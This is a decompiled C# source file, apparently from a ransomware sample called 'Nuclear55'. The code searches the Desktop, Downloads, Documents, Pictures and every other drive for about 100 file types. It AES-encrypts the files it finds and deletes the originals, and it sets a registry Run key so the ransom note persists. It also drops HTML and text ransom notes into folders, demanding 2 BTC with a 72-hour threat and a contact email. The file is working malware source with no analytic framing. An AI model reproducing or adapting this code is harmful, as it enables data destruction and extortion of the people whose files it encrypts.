using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using Nuke;

namespace ns0;

internal class Class0
{
	private AesCryptoServiceProvider aesCryptoServiceProvider_0;

	private Class2 class2_0;

	private byte[] byte_0;

	private byte[] byte_1;

	private string string_0;

	private string string_1;

	private int int_0 = 256;

	private int int_1 = 128;

	internal string string_2 = "nuclear55";

	internal string string_3;

	private List<string> list_0;

	internal Class0()
	{
		aesCryptoServiceProvider_0 = new AesCryptoServiceProvider();
		class2_0 = new Class2();
		string_3 = method_0();
		list_0 = new List<string>
		{
			"pdf", "gif", "bmp", "jpeg", "jpg", "xlsb", "xlsm", "xlsx", "xls", "png",
			"pst", "doc", "docx", "ppt", "ptx", "psd", "pdn", "txt", "zip", "xlr",
			"csv", "7z", "mp3", "mp4", "mov", "avi", "wmv", "flv", "dcr", "swf",
			"php", "htm", "html", "js", "backup", "dat", "data", "sql", "msg", "css",
			"odb", "odt", "odm", "odc", "wps", "rtf", "ai", "sav", "raw", "old",
			"r3d", "mdb", "dng", "3fr", "nef", "jpe", "accdb", "srw", "db", "pdb",
			"dbf", "tex", "pages", "pps", "key", "sdf", "xml", "mpa", "mid", "m3u",
			"3gp", "3g2", "mpg", "3ds", "3dm", "eps", "ps", "svg", "zipx", "cs",
			"fla", "cpp", "dtd", "java", "vb", "bak", "py", "vcxproj", "sln", "rar",
			"xhtml", "prc", "cer", "rm", "log", "u3d", "cf", "conf", "aes", "ico"
		};
		method_7();
	}

	internal string method_0()
	{
		return "!!_RECOVERY_instructions_!!";
	}

	internal string method_1(string string_4)
	{
		try
		{
			string[] array = string_4.Split(new char[1] { '.' });
			string text = array[array.Count() - 1];
			return text.ToLower();
		}
		catch
		{
			return string.Empty;
		}
	}

	internal Dictionary<string, string> method_2(string string_4)
	{
		string text = string_4.Split(new char[1] { '\\' })[^1];
		string text2 = string_4.Substring(0, string_4.Length - text.Length);
		string string_5 = smethod_1(text);
		string text3 = smethod_0(string_5);
		return new Dictionary<string, string>
		{
			{
				"Directory",
				text2 + text3
			},
			{ "FileName", text }
		};
	}

	internal static string smethod_0(string string_4)
	{
		string text = string_4.Remove(0, 3);
		string text2 = text.Substring(0, 16);
		List<string> list = new List<string> { "a", "B", "c", "d", "E", "W", "m", "=", "0", "1" };
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < text2.Length; i++)
		{
			if (i != 4)
			{
				if (int.TryParse(text2[i].ToString(), out var result))
				{
					stringBuilder.Append(list[result]);
				}
				else
				{
					stringBuilder.Append(text[i].ToString());
				}
			}
			else
			{
				stringBuilder.Append("+");
			}
		}
		return stringBuilder.ToString();
	}

	internal static string smethod_1(string string_4)
	{
		SHA256Managed sHA256Managed = new SHA256Managed();
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = sHA256Managed.ComputeHash(Encoding.UTF8.GetBytes(string_4), 0, Encoding.UTF8.GetByteCount(string_4));
		byte[] array2 = array;
		foreach (byte b in array2)
		{
			stringBuilder.Append(b.ToString("x2"));
		}
		return stringBuilder.ToString();
	}

	internal void method_3()
	{
		if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Nuclear55"))
		{
			Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Nuclear55");
		}
		_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Nuclear55";
		_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Nuclear55";
		Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft";
		method_9(text);
		method_10(text);
		Form1.list_1.Add(text + "\\" + string_3 + ".html");
		Form1.list_1.Add(text + "\\" + string_3 + ".txt");
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("nuke_html", text + "\\" + string_3 + ".html");
		}
		catch (SecurityException)
		{
		}
		method_9(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		method_10(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		try
		{
			string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*", SearchOption.AllDirectories);
			string[] array = files;
			foreach (string text2 in array)
			{
				try
				{
					foreach (string item in list_0)
					{
						if (method_1(text2) == item)
						{
							string text3 = text2;
							Dictionary<string, string> dictionary = method_2(text2);
							try
							{
								File.Move(text2, dictionary["Directory"]);
								text3 = dictionary["Directory"];
							}
							catch
							{
							}
							if (string_2.ToLower() != "default")
							{
								_ = text3 + "." + string_2;
							}
							else
								_ = text3;
							method_4(text3, dictionary["FileName"]);
						}
					}
				}
				catch
				{
				}
			}
			method_8(bool_0: true, bool_1: false, bool_2: false, bool_3: false);
		}
		catch
		{
		}
		try
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
			if (Directory.Exists(path))
			{
				string[] files2 = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
				string[] array2 = files2;
				foreach (string text4 in array2)
				{
					try
					{
						foreach (string item2 in list_0)
						{
							if (method_1(text4) == item2)
							{
								string text5 = text4;
								Dictionary<string, string> dictionary2 = method_2(text4);
								try
								{
									File.Move(text4, dictionary2["Directory"]);
									text5 = dictionary2["Directory"];
								}
								catch
								{
								}
								if (string_2.ToLower() != "default")
								{
									_ = text5 + "." + string_2;
								}
								else
									_ = text5;
								method_4(text5, dictionary2["FileName"]);
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			string[] directories = Directory.GetDirectories(folderPath, "*", SearchOption.AllDirectories);
			foreach (string text6 in directories)
			{
				try
				{
					foreach (string item3 in list_0)
					{
						if (method_1(text6) == item3)
						{
							string text7 = text6;
							Dictionary<string, string> dictionary3 = method_2(text6);
							try
							{
								File.Move(text6, dictionary3["Directory"]);
								text7 = dictionary3["Directory"];
							}
							catch
							{
							}
							if (string_2.ToLower() != "default")
							{
								_ = text7 + "." + string_2;
							}
							else
								_ = text7;
							method_4(text7, dictionary3["FileName"]);
						}
					}
				}
				catch
				{
				}
			}
			method_8(bool_0: false, bool_1: true, bool_2: false, bool_3: false);
		}
		catch
		{
		}
		try
		{
			string[] files3 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "*", SearchOption.AllDirectories);
			foreach (string text8 in files3)
			{
				try
				{
					foreach (string item4 in list_0)
					{
						if (method_1(text8) == item4)
						{
							string text9 = text8;
							Dictionary<string, string> dictionary4 = method_2(text8);
							try
							{
								File.Move(text8, dictionary4["Directory"]);
								text9 = dictionary4["Directory"];
							}
							catch
							{
							}
							if (string_2.ToLower() != "default")
							{
								_ = text9 + "." + string_2;
							}
							else
								_ = text9;
							method_4(text9, dictionary4["FileName"]);
						}
					}
				}
				catch
				{
				}
			}
			method_8(bool_0: false, bool_1: false, bool_2: true, bool_3: false);
		}
		catch
		{
		}
		try
		{
			string[] directories2 = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "*", SearchOption.AllDirectories);
			foreach (string text10 in directories2)
			{
				try
				{
					foreach (string item5 in list_0)
					{
						if (method_1(text10) == item5)
						{
							string text11 = text10;
							Dictionary<string, string> dictionary5 = method_2(text10);
							try
							{
								File.Move(text10, dictionary5["Directory"]);
								text11 = dictionary5["Directory"];
							}
							catch
							{
							}
							if (string_2.ToLower() != "default")
							{
								_ = text11 + "." + string_2;
							}
							else
								_ = text11;
							method_4(text11, dictionary5["FileName"]);
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		string pathRoot = Path.GetPathRoot(Environment.CurrentDirectory);
		string[] directories3 = Directory.GetDirectories(pathRoot, "*", SearchOption.TopDirectoryOnly);
		foreach (string text12 in directories3)
		{
			try
			{
				List<string> list = new List<string>
				{
					pathRoot + "\\Users",
					pathRoot + "\\NVIDIA",
					pathRoot + "\\Intel",
					pathRoot + "\\Documents and Settings",
					pathRoot + "\\Windows",
					pathRoot + "\\Program Files",
					pathRoot + "\\Program Files (x86)",
					pathRoot + "\\System Volume Information",
					pathRoot + "\\Recycler",
					"ProgramData",
					"PerfLogs",
					"Config.Msi",
					"$Recyle.Bin"
				};
				if (list.Contains(text12))
				{
					continue;
				}
				try
				{
					string[] files4 = Directory.GetFiles(text12, "*", SearchOption.AllDirectories);
					foreach (string text13 in files4)
					{
						try
						{
							foreach (string item6 in list_0)
							{
								if (method_1(text13) == item6)
								{
									string text14 = text13;
									Dictionary<string, string> dictionary6 = method_2(text13);
									try
									{
										File.Move(text13, dictionary6["Directory"]);
										text14 = dictionary6["Directory"];
									}
									catch
									{
									}
									if (string_2.ToLower() != "default")
									{
										_ = text14 + "." + string_2;
									}
									else
										_ = text14;
									method_4(text14, dictionary6["FileName"]);
								}
							}
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		IEnumerable<DriveInfo> enumerable = from driveInfo_0 in DriveInfo.GetDrives()
			where driveInfo_0.IsReady && driveInfo_0.RootDirectory.ToString() != Path.GetPathRoot(Environment.CurrentDirectory)
			select driveInfo_0;
		foreach (DriveInfo item7 in enumerable)
		{
			try
			{
				string[] files5 = Directory.GetFiles(item7.RootDirectory.ToString(), "*", SearchOption.AllDirectories);
				foreach (string text15 in files5)
				{
					try
					{
						foreach (string item8 in list_0)
						{
							if (method_1(text15) == item8)
							{
								string text16 = text15;
								Dictionary<string, string> dictionary7 = method_2(text15);
								try
								{
									File.Move(text15, dictionary7["Directory"]);
									text16 = dictionary7["Directory"];
								}
								catch
								{
								}
								if (string_2.ToLower() != "default")
								{
									_ = text16 + "." + string_2;
								}
								else
									_ = text16;
								method_4(text16, dictionary7["FileName"]);
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
		method_8(bool_0: false, bool_1: false, bool_2: false, bool_3: true);
	}

	private void method_4(string string_4, string string_5)
	{
		try
		{
			string path = ((string_2.ToLower() != "default") ? (string_4 + "." + string_2) : (string_4 + ".enc"));
			string text = ((string_2.ToLower() != "default") ? (string_4 + "." + string_2) : string_4);
			FileStream fileStream = new FileStream(string_4, FileMode.Open, FileAccess.Read);
			FileStream fileStream2 = new FileStream(path, FileMode.Create, FileAccess.Write);
			aesCryptoServiceProvider_0.KeySize = int_0;
			aesCryptoServiceProvider_0.BlockSize = int_1;
			aesCryptoServiceProvider_0.Key = byte_0;
			aesCryptoServiceProvider_0.IV = byte_1;
			ICryptoTransform transform = aesCryptoServiceProvider_0.CreateEncryptor();
			CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write);
			byte[] array = new byte[fileStream.Length];
			fileStream.Read(array, 0, array.Length);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			if (string_2.ToLower() != "default")
			{
				File.Delete(string_4);
			}
			else
			{
				File.Delete(string_4);
				File.Move(string_4 + ".enc", string_4);
			}
			string text2 = "<start_file_name>" + string_5 + "<end_file_name>";
			string text3 = "<start_btc_addr>" + Form1.string_1 + "<end_btc_addr>";
			string text4 = string_0;
			string text5 = string_1;
			string text6 = class2_0.method_0(text4 + " " + text5);
			string s = text2 + text3 + text6;
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			using (FileStream fileStream3 = new FileStream(text, FileMode.Append))
			{
				fileStream3.Write(bytes, 0, bytes.Length);
				fileStream3.Flush();
				fileStream3.Close();
			}
			Form1.list_0.Add((string_2.ToLower() != "default") ? text : string_4);
		}
		catch
		{
		}
	}

	internal void method_5(string string_4)
	{
		string value = ((string_2.ToLower() != "default") ? (string_4 + "." + string_2) : string_4);
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Nuclear55\\files.dat";
		method_6(text);
		using StreamWriter streamWriter = File.AppendText(text);
		streamWriter.Write(value);
		streamWriter.Write(Environment.NewLine);
		streamWriter.Flush();
		streamWriter.Close();
	}

	internal void method_6(string string_4)
	{
		if (!File.Exists(string_4))
		{
			FileStream fileStream = File.Create(string_4);
			fileStream.Close();
		}
	}

	internal void method_7()
	{
		string text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!/'@$%^*()?.[]-=~<>+_#1234567890";
		string text2 = string.Empty;
		string text3 = string.Empty;
		Random random = new Random();
		for (int i = 0; i < 32; i++)
		{
			text2 += text[random.Next(0, text.Length - 1)];
		}
		for (int j = 0; j < 16; j++)
		{
			text3 += text[random.Next(0, text.Length - 1)];
		}
		string_0 = text2;
		string_1 = text3;
		byte_0 = Encoding.UTF8.GetBytes(text2);
		byte_1 = Encoding.UTF8.GetBytes(text3);
	}

	internal void method_8(bool bool_0, bool bool_1, bool bool_2, bool bool_3)
	{
		_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Nuclear55";
		if (bool_0)
		{
			string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*", SearchOption.AllDirectories);
			string[] array = directories;
			foreach (string string_ in array)
			{
				try
				{
					method_9(string_);
					method_10(string_);
				}
				catch
				{
				}
			}
		}
		if (bool_1)
		{
			string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "*", SearchOption.AllDirectories);
			string[] array2 = directories;
			foreach (string string_2 in array2)
			{
				try
				{
					method_9(string_2);
					method_10(string_2);
				}
				catch
				{
				}
			}
		}
		if (bool_2)
		{
			string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "*", SearchOption.AllDirectories);
			string[] array3 = directories;
			foreach (string string_3 in array3)
			{
				try
				{
					method_9(string_3);
					method_10(string_3);
				}
				catch
				{
				}
			}
		}
		if (!bool_3)
		{
			return;
		}
		IEnumerable<DriveInfo> enumerable = from driveInfo_0 in DriveInfo.GetDrives()
			where driveInfo_0.IsReady && driveInfo_0.RootDirectory.ToString() != Path.GetPathRoot(Environment.CurrentDirectory)
			select driveInfo_0;
		foreach (DriveInfo item in enumerable)
		{
			try
			{
				string[] directories2 = Directory.GetDirectories(item.RootDirectory.ToString(), "*", SearchOption.AllDirectories);
				foreach (string string_4 in directories2)
				{
					try
					{
						method_9(string_4);
						method_10(string_4);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}

	private void method_9(string string_4)
	{
		string ransom_html = Class3.ransom_html;
		using FileStream fileStream = File.Create(string_4 + "\\" + string_3 + ".html", 1024);
		byte[] bytes = Encoding.UTF8.GetBytes(ransom_html);
		fileStream.Write(bytes, 0, bytes.Length);
		fileStream.Flush();
		fileStream.Close();
	}

	private void method_10(string string_4)
	{
		FileStream stream = new FileStream(string_4 + "\\" + string_3 + ".txt", FileMode.Create, FileAccess.ReadWrite);
		StreamWriter streamWriter = new StreamWriter(stream);
		streamWriter.WriteLine("<" + Environment.MachineName + ">");
		streamWriter.WriteLine();
		streamWriter.WriteLine("!! Your files and documents on this computer have been encrypted !!");
		streamWriter.WriteLine();
		streamWriter.WriteLine("** What has happened to my files? **");
		streamWriter.WriteLine("Your important files on your computer; photos, documents, and videos have been encrypted. Your files were encrypted using AES and RSA encryption.");
		streamWriter.WriteLine();
		streamWriter.WriteLine("** What does this mean? **");
		streamWriter.WriteLine("File encryption was produced using a unique 256-bit key generated specifically for this machine. Encryption is a way of securing data and requires a special key to decipher.");
		streamWriter.WriteLine();
		streamWriter.WriteLine("Unforunate for you, this special key was encrypted using an additional layer of encryption; RSA. Your files were encrypted using the public RSA key. To truly reverse the unfortunate state of your files, you need the private RSA key which is only known by us.");
		streamWriter.WriteLine();
		streamWriter.WriteLine("** What should I do next? **");
		streamWriter.WriteLine("For your information your private key is a paid product. If you really value your data we suggest you start acting fast because you only short amount of time to recover your files before they are gone forever.");
		streamWriter.WriteLine();
		streamWriter.WriteLine("There are no solutions to this problem, and no anti-virus software can reverse the process of file encryption because we have also erased recent versions of your files which means you cannot use file recovery software.");
		streamWriter.WriteLine();
		streamWriter.WriteLine("Modifying your files in any way can damage your files permenantly and we will no longer be able to help you. Follow our terms assigned to you below, and we will have your files recovered.");
		streamWriter.WriteLine();
		streamWriter.WriteLine("You now have 72 hours to make payment before we destroy your encryption keys, leaving your files damaged for good");
		streamWriter.WriteLine();
		streamWriter.WriteLine("How do I recovering my files?");
		streamWriter.WriteLine();
		streamWriter.WriteLine("Without Bitcoins your files can never be recovered. Follow the steps below:");
		streamWriter.WriteLine();
		streamWriter.WriteLine("[1] => Create a Bitcoin wallet");
		streamWriter.WriteLine("In order to use Bitcoin you will need to setup your own Bitcoin wallet. We recommend blockchain.info. However, if you already own a Bitcoin wallet you can skip this step.");
		streamWriter.WriteLine();
		streamWriter.WriteLine("[2] => Purchase Bitcoins");
		streamWriter.WriteLine("There are a number of ways to purchase Bitcoins, whether you're paying by cash, credit/debit card, or direct from your bank account. A range of Bitcoin sellers make Bitcoins easy to obtain.");
		streamWriter.WriteLine();
		streamWriter.WriteLine("https://localbitcoins.com Buy bitcoins with bank transfer, cash, and Moneygram (best option - worldwide)");
		streamWriter.WriteLine("https://coinatmradar.com Buy bitcoins from local ATM machines");
		streamWriter.WriteLine("https://bittylicious.com Buy bitcoins with bank transfer or debit card (United Kingdom) ");
		streamWriter.WriteLine("https://cex.io Buy bitcoins with credit/debit card or bank transfer)");
		streamWriter.WriteLine("https://btcdirect.eu Buy bitcoins in Europe");
		streamWriter.WriteLine("https://coincorner.com Buy bitcoins in Europe with credit or debit card ");
		streamWriter.WriteLine();
		streamWriter.WriteLine("[3] => Send bitcoins to our address");
		streamWriter.WriteLine("You should send 2 BTC to our Bitcoin address: 1NLLrung1MaXucHpAzY5KjdK4y8woodJWt");
		streamWriter.WriteLine();
		streamWriter.WriteLine("[4] => Contact us and receive encryption keys, and file recovery software");
		streamWriter.WriteLine("- Send an email with the subject 'PAYMENT' along with 1 encrypted file attached [these end in .nuclear55], to opengates@india.com");
		streamWriter.WriteLine("- Wait for a response from us (up to 24-48 hours)");
		streamWriter.WriteLine("- Receive file decryption software to decrypt every encrypted file on the hard drive");
		streamWriter.WriteLine("- If you do not here from us after 3 days, register an account on mail.india.com and email us. Your mail provider may be blocking us");
		streamWriter.WriteLine("- We will not respond without proof of payment. If you waste our time, we will destroy your encryption key and waste the life of your files");
		streamWriter.WriteLine();
		streamWriter.WriteLine("-----------------------------------------------------------------");
		streamWriter.WriteLine("Our service is not designed to harm his/her computer in any way, but to provide a full decryption service of the intended computer and allow the user to regain access to the specified files.");
		streamWriter.WriteLine("-----------------------------------------------------------------");
		streamWriter.Flush();
		streamWriter.Close();
	}

	internal RegistryKey method_11(string string_4 = "")
	{
		if (Registry.CurrentUser.OpenSubKey("Software\\Nuclear55" + string_4) == null)
		{
			Registry.CurrentUser.CreateSubKey("Software\\Nuclear55" + string_4);
		}
		return Registry.CurrentUser.OpenSubKey("Software\\Nuclear55" + string_4, writable: true);
	}
}
